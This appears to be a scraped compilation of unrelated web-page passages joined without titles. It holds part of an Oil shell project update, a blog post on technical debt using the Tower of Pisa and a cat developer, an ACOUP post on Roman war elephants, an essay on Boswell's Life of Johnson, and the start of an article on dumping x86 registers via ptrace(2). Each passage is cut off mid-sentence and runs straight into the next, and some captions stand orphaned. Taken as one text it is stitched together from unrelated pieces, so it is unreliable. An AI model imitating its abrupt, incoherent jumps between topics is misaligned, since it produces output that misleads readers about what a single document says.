<a href="https://github.com/oilshell/oil/wiki/Fish-Oil-Brainstorming">discussed this</a>
with the maintainer, and there's some interest.  But it's a lot of work, which
shouldn't be taken for granted, and there are unsolved problems.)</p>
<p>Achieving this OSH language milestone feels very doable, since everything
already works in Python, and something like <strong>915</strong> out of <strong>1685</strong> spec tests
pass in C++ (yielding a 30x - 50x speedup).</p>

<a name="oil-language-updates"></a>
<h3>Oil Language Updates</h3>
<p>But I'm not giving up on the Oil language!  I just need help. It exists in
prototype form, and your feedback will motivate me to work on it.</p>
<p>Here are some blog posts I want to write, to get the word out:</p>
<p><em>Four Features of the Oil Language</em>.  This post narrowed down OSH to four major
features, and Oil also has four:</p>
<ol>
<li>Python-like expressions, along with <a href="http://www.oilshell.org/release/latest/doc/eggex.html">eggexes</a></li>
<li>Ruby-like blocks, which enable DSLs and declarative configuration</li>
<li>procs (shell functions with signatures, <a href="http://www.oilshell.org/blog/tags.html?tag=shell-the-good-parts#shell-the-good-parts">which compose in unique
ways</a>)</li>
<li>Serialization formats like JSON and QTSV
(<a href="https://github.com/oilshell/oil/wiki/TSV2-Proposal">proposal</a>).  The
latter is a format for <a href="http://www.oilshell.org/blog/2018/11/30.html">typed tables</a>, built on top
of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>.</li>
</ol>
<p>We have working prototypes for every feature except QTSV.  You can <a href="http://oilshell.org/release/latest/">try them
now</a>!</p>
<p><em>Big Changes to the Oil Language</em>.  A list of recent changes I've made, which
should give potential contributors a feel for the language.</p>
<p><em>What Distinguishes Python, JS, and Ruby from Perl and PHP</em>.   The former
languages have a clean data model / memory model: a garbage collected heap with
reference semantics.</p>
<p>The latter languages have warts in their model.  Oil adds the clean model to
shell.</p>
<p><em>Comments on Comics</em>.  I can use these <a href="https://wizardzines.com/comics/bash-errors/">recent
comics</a> as a way to explain the
<a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.  (See other posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=comic#comic">comic</a>.)</p>

<a name="summary"></a>
<h2>Summary</h2>
<p>I described 4 essential features of an improved shell language.  <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">Let me
know</a> what you think is missing.</p>
<p>If you haven't read it already, see <a href="http://www.oilshell.org/blog/2018/01/28.html">Why Create a Unix
Shell?</a>.  It's the most popular page on this site,
though I still need to update it for 2021.</p>
<p>I then proposed a focus on making the OSH language "production ready".  I'm
still going to work on the Oil language, but I need help finishing it.</p>

<h3>Dev Tools Improvements</h3>
<p>Speaking of which, several people have pointed out that the dev process for Oil
is difficult.  I've addressed this recently by removing spew from …</p></div>

            <p>As you can see, this is a well-known monument in Italy, more specifically in Pisa, hence it’s name: <strong>Tower of Pisa.</strong></p>
<p><img alt="Pisa Tower picture" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower.png"></p>
<p>This tower has a very interesting history, it was built around the 12th century, but due to the soft ground it was built on, it started tilting. The structure was only stabilized in 2001 after 8 years of remedial work.</p>
<p>Actually, one of the corrections made during these 8 years made the tilting even worse!
Let those who never made a refactoring that made the problem worse throw the first stone. I can’t really blame anyone haha.</p>
<h2>John, the <em>purrgrammer</em></h2>
<p><img alt="John working in a computer" src="https://labcodes.com.br/blog/images/tech-debt/chico-the-purrgrammer.png"></p>
<ul>
<li>This is John.</li>
<li>John is a Senior Developer always with a lot on his plate.</li>
<li>John is also an amazing programmer with a lot of years of experience.</li>
</ul>
<p>Suddenly, a new project arrived at John’s desk, and it needed:</p>
<p><img alt="John playing with a ball" src="https://labcodes.com.br/blog/images/tech-debt/chico-features.png"></p>
<ul>
<li>Payment System</li>
<li>Social Network Authentication</li>
<li>Delivery services integration</li>
</ul>
<p>Since John is an excellent professional that always delivers his activities, he tackled the new project head-on and delivered it in time.</p>
<p><img alt="John is happy because he delivered the project in time" src="https://labcodes.com.br/blog/images/tech-debt/chico-delivered.png"></p>
<p>After John’s delivery, the rest of his team went on to review his code, and they discovered a few problems, such as:</p>
<p><img alt="Cat's reviewing John's code" src="https://labcodes.com.br/blog/images/tech-debt/chico-team-review.png"></p>
<ul>
<li>Bugs and inconsistency on payments</li>
<li>Sometimes the deliveries weren’t processed</li>
<li>Authentication was too simple when checking the social networks used</li>
</ul>
<p><img alt="John is sad because his project had some bugs" src="https://labcodes.com.br/blog/images/tech-debt/chico-bugs.png"></p>
<p>John knew his code had a few bugs. But nearing the deadline, another project appeared and it took a lot of John’s time, so he couldn’t go back and fix the problems.</p>
<p>John and his team had to deliver the project riddled with bugs and problems.</p>
<p>But John kept a positive attitude.</p>
<p>“In the future, I’ll go back and fix those bugs”</p>
<p><img alt="John is happy again, he knows that in the future he'll fix everything" src="https://labcodes.com.br/blog/images/tech-debt/chico-refactoring-en.png"></p>
<h3>SPOILER</h3>
<p>C’mon, did you really think that this was going to happen?</p>
<p><img alt="The problems in John’s project" src="https://labcodes.com.br/blog/images/tech-debt/problems-on-chicos-code-en.png"></p>
<p>Let’s dive deeper into the problems of John’s code: </p>
<ul>
<li>Payments couldn’t be processed in different currencies</li>
<li>If the delivery system is offline, the code wouldn’t work</li>
<li>Users with deactivated accounts could still access the system</li>
<li>No automated testing</li>
</ul>
<p>And this, my friends, is what we know as Technical Debt. Why?</p>
<p>Because what happened was that John chose the first solution he could think of in that short deadline, this affected the code’s quality and the team accepted this. In the future, if any logistics of the business, such as accepting different kinds of currency or changing the delivery service, needs to be changed, the <strong>Changing Cost</strong> of the code is going to be enormous. The moment John chose the faster and easiest solution for him was the moment that the Technical Debt was inserted in the code.</p>
<p>What happened with the Tower of Pisa is a lot like what we understand as Technical Debt.</p>
<p><img alt="Picture from the Tower under construction" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower-construction.png"></p>
<p>It probably started off as a couple of small mistakes and problems, but the constructors decided to ignore them and build and scale on top of these problems. The tower was built so fast that these little “bugs” in the construction jeopardized the whole structure.</p>
<p>And the same thing can happen with software. The difference is that the bugs and problems are easier to spot in the developing process, because, after a while, new features become impossible to deliver before um fix these bugs.</p>
<h2>Why is Technical Debt always bad?</h2>
<p>We are used to understanding any Technical Debt in software as a very bad thing. And it usually is.</p>
<p>But we can also see it as a strategic and/or economic decision since a project riddled with Technical Debt is still a project that was delivered fast. It can be a very positive thing for the product.</p>
<p>The problem with this approach starts when we start to forget what we have done in the past. Imagine that Technical Debt is a really greasy and tasty junk food. To eat it once or twice may be wonderful, but after the eighth ou ninth meal, it might be time to acknowledge you have a problem.</p>
<p>By accepting that it is a tradeoff, we can move faster to pay the debt in the future. It really something very normal to do.</p>
<p><img alt="Losing Quality vs. Speed up deliveries" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-tradeoff-en.png"></p>
<p>I don’t know how many of you have paid the cost of too much junk food. Just remember that this cost, as well as in software, becomes higher with time.</p>
<p>If you identified some of these situations in your day-to-day tasks, don’t worry, especially if you have some time dedicated to remedying the problem in the future. This is a really common scenario when dealing with software delivery.</p>
<h2>Technical Debt Quadrant</h2>
<p><img alt="Martin Fowler’s Technical Debt Quadrant" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-quadrant-en.png"></p>
<p>If we look at <a href="https://martinfowler.com/bliki/TechnicalDebtQuadrant.html" target="_blank">Martin Fowler’s Technical Debt Quadrant</a>, we can see John in the upper quadrants, between Reckless and Prudent. </p>
<p>He knew he didn’t have enough time to design the best solution, but he also knew that: In the future, he had to come back and improve his code.</p>
<p>Ok, accepting this as something ordinary, we can try to understand who is really responsible for the software’s debt.</p>
<h2>Who’s responsible for the debt?</h2>
<p>If we focus on the name (Technical Debt), we’re lead to think that it’s a problem made by technical people, namely: the developers, who are responsible for writing the code that ultimately caused the debt.</p>
<p>The problem is that software is the result of the structure and processes of a whole company.</p>
<p>Also, the whole software industry changed since the term “Technical Debt” was born. In John’s scenario, for example, the problem with the not-so-good solution that he crafted is more connected to a management issue, or even to the product team, than to himself. We know John is a good developer, but he had to ignore a lot of problems in order to deliver within the established deadline.</p>
<p>Sometimes the bottlenecks that are creating debt come from different parts of the company, such as:</p>
<ul>
<li>Management team vs Developers speed</li>
<li>Product team not having a long-term plan</li>
<li>UI/UX team too far from the developers</li>
</ul>
<p>But we can’t forget that, sometimes, we are indeed to blame for our own bad decisions.</p>
<p><img alt="John is sad because his bad decisions also affect the project" src="https://labcodes.com.br/blog/images/tech-debt/our-responsability-en.png"></p>
<ul>
<li>Our bad decisions counts</li>
<li>Framework smells</li>
<li>Low test coverage</li>
</ul>
<p>Like when we choose a new and exciting framework, without investing the necessary time to understand if that is the best tool for the job at hand, or even when we stop paying attention to the signs that a framework is being abandoned, or when the developers aren’t testing and refactoring the application as they should… All of this is our fault. </p>
<p>After discovering which problems we have in our code, we need to look for the tools we can use to help us deal with the situation.</p>
<h2>How to deal with the debt?</h2>
<ul>
<li>Rewriting everything?</li>
<li>Hire more people just to deal with the debt?</li>
<li>Stop delivering until we can fix some of the debt?</li>
<li>Creating Technical Debt tasks in a separate Technical Debt board?</li>
</ul>
<p>Imagine if people had simply stopped building the Tower of Pisa and destroyed everything to rebuild. The chances of the same mistakes happening, or even new mistakes, were really high. And consider the amount of money necessary for demolishing and rebuilding everything.</p>
<p>What if the company simply hired more people to fix the debts? In the case of the Tower, we would have people trying to build it higher working alongside people trying to make it straight and steady. This really doesn’t solve the main problem.</p>
<p>In software, hiring a new team to deal with existing problems would mean that the old team would have to take the time to explain the whole context of the software to the new team. And, believe me, this would take a lot more time than you’d think. </p>
<p>And what if we created a new place to store our Technical Debt task? After a while, this place would become completely invisible to the team.</p>
<p><img alt="Comic strip from the process of creating a new tech debt ticket and adding it to a backlog full of forgotten tickets using dead plants as an analogy" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-backlog.png"></p>
<p>If an ordinary developer’s backlog already has its own old and invisible tasks, imagine creating a whole different board with separate tasks. However, these are the solutions most people usually look for.</p>
<p>So, Luan, if these options aren’t the most viable, what can we do?</p>
<p>After what we already know, we must try to find truly viable solutions to deal with the Technical Debt.</p>
<h2>Sustainable solutions</h2>
<h3>1. I.M.P.A.C.T</h3>
<p><img alt="I.M.P.A.C.T cyclic process" src="https://labcodes.com.br/blog/images/tech-debt/impact.png"></p>
<p>IMPACT is a process to:</p>
<ul>
<li>Identify</li>
<li>Mark</li>
<li>Plan</li>
<li>Act</li>
<li>Test</li>
</ul>
<p>As we can see, the first step is about finding the debt spots and, in the second step, we need to make sure that these spots are noticeable for the whole team. You can assure that by creating new tasks flagged as Technical Debt, for example. We can also choose the priorities of these tasks based on their relevance. Tools like Jira have mechanisms to increase the priority of certain tasks over time, which is amazing, because, as we have seen before, the cost of a Technical Debt increases over time.</p>
<p>After that, we need to create a plan, and really follow that plan, for the marked tasks. This way, we will effectively Act on the debts and, after the fixes and improvements being implemented, we need to Test and assure that no behaviors were damaged, be it new bugs, features, improvements, or anything that could hinder the final experience.</p>
<p>You can find more detailed information about this in a book called “Refactoring for Software Design Smells - Managing Technical Debt”.</p>
<h3>2. Pareto Principle</h3>
<p>If you don’t know how many tasks you should have for each team iteration.</p>
<p><img alt="Pareto principle demonstrated using Pizza slices" src="https://labcodes.com.br/blog/images/tech-debt/pareto-principle-en.png"></p>
<p>We can use the Pareto Principle to assign 20% of the team’s productivity to Technical Debt tasks, and the 80% that remains is used in ordinary tasks, as new features, bug fixing, and everything else.</p>
<h3>3. Technical Debt Review Reunions</h3>
<p><img alt="Cat's in a Tech Debt review" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-review.png"></p>
<p>If you have big deliveries in your process after a few iterations, it might be a good thing to have post-mortem reunions to discuss everything that’s been introduced to the code that has the potential to increase the Technical Debt.</p>
<p>By doing this, we can identify the debts earlier.</p>
<p>These are three examples of possible solutions, but I’d advise you to be extra critical and choose the one that fits you and your team the best.</p>
<p>Let’s probe the economical side of this problem. Is it lucrative to work with a system that already has a big Technical Debt cost?</p>
<h2>Is it lucrative</h2>
<p>I’m going to use a lecture by <a href="https://www.youtube.com/watch?v=TQ9rng6YFeY" target="_blank">J.B. Rainsberger</a> to illustrate my point. In this lecture, Rainsberger explains the cost of the next new feature for your software and how to diminish your error rate when estimating this cost.</p>
<p><img alt="Chart comparison of the two approaches of software coding" src="https://labcodes.com.br/blog/images/tech-debt/next-feature-cost.png"></p>
<p>In this chart, he compares two different costs over time in a project.</p>
<p>As we can see, the cost of a software built without …</p></div></div>

October 23, 2020 | https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Today, in Part II of our three part series on War Elephants, we’re going to look at the drawbacks of war elephants.  Last time (<a href="https://acoup.blog/2019/07/26/collections-war-elephants-part-i-battle-pachyderms/">here</a>), we discussed the factors that made war elephants so powerful on the battlefield.  To recap: war elephants had a strong psychological element (they are very scary) and could drastically disrupt both infantry and cavalry alike, leaving them easy pickings for forces supporting the war elephant.  Those uses made war elephants popular not only in India, where they were first developed, but among Alexander the Great’s successors, and even as far west as Carthage.  <a href="https://acoup.blog/2019/08/09/collections-war-elephants-part-iii-elephant-memories/">And next time, we’ll look at why elephants <em>remained</em> popular in India</a>, despite the drawbacks we’ll discuss today.</p>



<p>The best way to think about the weaknesses of war elephants is to look at the question with a specific context, so we are going to narrow in on one of the two key areas where war elephants did not last as a weapon system: the Roman world (both the period of the Republic and the Empire).  As I mentioned in the last post, by the Imperial period, the Romans seem to have decided that elephants were not worth the trouble and discontinued their use.  Roman military writers routinely disparage elephants (we’ll see why) as weapons of war and despite the fact that Rome absorbed not one but <em>three</em> states which actively used elephants in war (Carthage, the Ptolemaic and Seleucid Kingdoms) – and thus we may assume three sets of capture, training and breeding programs for maintaining the animals – they did not continue their use.  It is one thing not to adopt a foreign weapon, it is quite another to inherit the entire production complex and still say, “no, not for me.”</p>

I missed this last time, but I just want to note <strong>everything</strong> is wrong with this.  Let me count the ways:<br>1) These elephants are <strong>way</strong> too big.<br>2) The towers on their backs won’t be invented for more than a century<br>3) The bit-and-bridle system of control is not how elephants are controlled.<br>4) The weapons for the tusks are also wrong.<br>5) <strong>Xerxes didn’t have any elephants in his army</strong> (not even in the fantasy count that Herodotus gives)<br>6) This is not how you fight elephants and will get everyone stepped on.<br>One of these days, we’re going to talk about this movie and Sparta.  Until then: <strong>Sparta is terrible.</strong></figcaption></figure>



<p>So today we’re going to ask, “why?”  We’ve answered that question in the immediate term – to quote Trautmann (2015) on the point, “the Roman refusal of the war elephant..was based upon a low estimate of its value” (250).  To put another way, they thought they sucked.  We know elephants <em>could</em> be quite potent in battle, so the answer must be a touch more complicated.  We’ll look at this two ways: first (because it’s me) in terms of <em><strong>logistics</strong></em>, and then in terms of anti-elephant <em><strong>tactics</strong></em>, to see why elephants could not succeed against (or with) Rome.  I am also going to speculate – just a touch – on which of these factors might explain the other major area elephant warfare did not penetrate: China.</p>



<h2>Roman Elephants</h2>



<p>But first, a necessary caveat to an objection no doubt already brewing in the minds of some: but didn’t the Romans use elephants sometimes?  Yes, though Roman employment of elephants was at best uneven (this is a point, I’d like to note, where Trautmann (2015) shows its value over, for instance, J. M. Kistler’s <em>War Elephants </em>(2006) – the latter’s reading of Roman use of war elephants bends the evidence to serve an argument, rather than the other way around).  Nevertheless, the Romans did use war elephants during the last two centuries of the Republic.</p>



<p>The Romans had some war elephants (just 20) at Cynocephelae (197 B.C.) against Macedon – these had been drawn from the kingdom of Numidia, which had sided with Rome against Carthage in the Second Punic War.  Plutarch (<em>Flam</em>. 8.2-5) leaves the animals out of the battle narrative, but Livy (who is the better source; Liv. 33.9) notes their use to break up the Macedonian right wing, which was not yet even in fighting formation.  It’s not clear the elephants were necessary for the Roman victory here and the key action was actually a flanking attack by infantry.</p>



<p>The Romans brought elephants to Magnesia (190 B.C.), but left them in reserve; the Romans only had a few, whereas their Seleucid opponents had brought many more.  Moreover, the Roman elephants were smaller African elephants, effectively useless against the large Asian elephants the Seleucids used.  Pydna (168 B.C.) against the Macedonians again, is harder to assess because the sources for it are poor (part of Livy’s narrative of the battle is lost).  Plutarch (<em>Aem.</em> 19-22) leaves the elephants out again, whereas Livy stops to expressly say they were useless.  Kistler (himself reliant on other scholars to read the Latin for him) reads this as the elephants being the decisive element; the sources cannot support this reading.  Livy – who appears to be quoting Polybius, a contemporary of the battle – is quite clear what he thinks of the elephants, “For as new inventions often have great force in the words of men, but when tried, when they need to work, and not just have their working described, they evaporate without any effect – just so the war elephants were just a name without any real use.” (<a href="http://www.perseus.tufts.edu/hopper/text?doc=Perseus%3Atext%3A1999.02.0211%3Abook%3D44%3Achapter%3D41">Liv 44.41.4</a>, my rough translation).</p>

<p>The Romans did find elephants useful in places like Spain or southern Gaul (modern Provence) where just a handful could bewilder and terrify opponents completely unused to and unprepared for them.  The last gasp of true Roman war elephants came in 46 B.C., where Julius Caesar defeated a Roman army led by Metellus Scipio which had sixty elephants in it.  The elephants lost and one of Caesar’s legions (my personal favorite, Legio V Alaudae (Larks!)) took the elephant as a legionary symbol in commemoration of having beaten them.</p>



<p>So absolutely yes, the Romans of the Middle and Late Republic made some use of war elephants, but it was hardly a distinguished run.  As Trautmann notes – quite correctly, in my view – the Romans were always more interested in ways to defeat elephants than to use them.  Which brings us back to our question: elephants are <strong>awesome</strong>, Romans are <em>also awesome</em>…so why didn’t the Romans like elephants?</p>



<h2>Elephant Logistics</h2>



<p>From trunk to tail, elephants are a logistics <em>nightmare</em>.</p>



<p>And that begins almost literally at birth.  For areas where elephants are native, nature (combined, typically, with the local human terrain) create a local ‘supply.’  In India this meant the elephant forests of North/North-Eastern India; the range of the North African elephant (<em>Loxodonta africana pharaohensis</em>, the most likely source of Ptolemaic and Carthaginian war elephants) is not known.  Thus for many elephant-wielding powers, trade was going to always be a key source for the animals – either trade with far away kingdoms (the Seleucids traded with the Mauyran Indian kingdom for their superior Asian elephants) or with thinly ruled peripheral peoples who lived in the forests the elephants were native to.</p>



<p>(We’re about to get into some of the specifics of elephant biology.  If you are curious on this topic, I am relying heavily on R. Sukumar, <em>The Asian Elephant: Ecology and Management</em> (1989).  I’ve found that information on Asian elephants (<em>Elephas maximus</em>) <strong>much</strong> easier to come by than information on African elephants (<em>Loxodonta africana</em> and <em>Loxodonta cyclotis</em>).)</p>



<p>In that light, creating a breeding program – as was done with horses – seems like a great idea.  Except there is one major problem: a horse requires about four years to reach maturity, a mare gestates a foal in eleven months and can go into heat almost immediately thereafter.  By contrast, elephants reach adulthood after seventeen years, take 18-22 months to gestate and female elephants do not typically mate until their calf is weaned, four to five years after its birth.  A ruler looking to build a stable of cavalry horses thus may start small and grow rapidly; a ruler looking to build a corps of war elephants is looking at a very slow process.  This is compounded by the fact that elephants are notoriously difficult to breed in captivity.  There is some speculation that the Seleucids nonetheless attempted this at Apamea, where they based their elephants – in any event, they seem to have remained dependent on imported Indian elephants to maintain the elephant corps.  If a self-sustaining elephant breeding program for war elephants was ever created, we do not know about it.</p>



<p>To make matters <em>worse</em>, elephants require <strong>massive</strong> amounts of food and water.  In video-games, this is often represented through a high elephant ‘upkeep’ cost – but this often falls well short of the reality of keeping these animals for war.  Let’s take <em>Total War: Rome II</em> as an example: a unit of Roman (auxiliary) African elephants (12 animals), costs 180 upkeep, compared to 90 to 110 upkeep for 80 horses of auxiliary cavalry (there are quite a few types) – so one elephant (with a <em>mahout</em>) costs 15 upkeep against around 1.25 for a horse and rider (a 12:1 ratio).  Paradox’s <em>Imperator</em> does something similar, with a single unit of war elephants requiring 1.08 upkeep, compared to just 0.32 for light cavalry; along with this, elephants have a heavy ‘supply weight’ – twice that of an equivalent number of cavalry (so something like a 2:1 or 3:1 ratio of cost).</p>

<p>Believe it or not, this <em>understates</em> just how hungry – and expensive – elephants are.  The standard barley ration for a Roman horse was 7kg of barley per day (7 Attic medimnoi per month; Plb. 6.39.12); this would be supplemented by grazing.  Estimates for the food requirements of elephants vary widely (in part, it is hard to measure the dietary needs of grazing animals), but elephants require in excess of 1.5% of their body-weight in food <em>per day</em>.  …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn10521873801" rel="footnote"><sup id="fnref10521873801">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn10521873802" rel="footnote"><sup id="fnref10521873802">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn10521873803" rel="footnote"><sup id="fnref10521873803">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn10521873804" rel="footnote"><sup id="fnref10521873804">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn10521873805" rel="footnote"><sup id="fnref10521873805">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/cpu-context-switch.svg" alt="Context Switch"></p>

<p>In this article, I would like to shortly describe the methods used
to dump and restore the different kinds of registers on 32-bit
and 64-bit x86 CPUs.  The first part will focus on General Purpose
Registers, Debug Registers and Floating-Point Registers up to the XMM
registers provided by the SSE extension.  I will explain how their
values can be obtained via the <code>ptrace(2)</code> interface.</p>

<p>The <code>ptrace(2)</code> API is commonly used in all modern BSD systems
and Linux, as all of them derive it from the original form designed
and implemented in 4.3BSD.  The primary focus in this article is
on the FreeBSD and NetBSD systems.  Nevertheless, the users of other
Operating Systems such as OpenBSD, DragonFly BSD or Linux can still
benefit from this article as the basic principles are the same
and the code examples are intended to be easily adapted to other
platforms.</p>

<p>A single CPU (in modern hardware: CPU core or CPU thread,
if hyperthreading is available) can execute only one program thread
at a time.  In order to be able to run multiple processes and threads
quasi-simultaneously, the Operating System must perform <em>context
switching</em> — that is periodically suspend the currently running thread,
save its state, restore the saved state of another thread and resume it.
Saving and restoring the values of the processor’s registers play
an important part in context switching.  It is important that
this process is fully transparent to the process being switched,
and in a properly implemented kernel there should be no side effects
that are perceptible to the program.</p>

<p>The debugger may need to examine the register sets of the debugged
program for a number of reasons.  By inspecting the Program Counter,
it is able to determine the location in source code at which
the execution will continue, and by altering it it can control
the execution.  The Stack Pointer is necessary to introspect variables
stored on the stack, while the remaining registers can hold variables
themselves.</p>

<p>A special set of the x86 registers are the Debug Registers.  They are
not accessible to the program itself; however, they can be read
or written by the debugger.  They allow setting hardware assisted
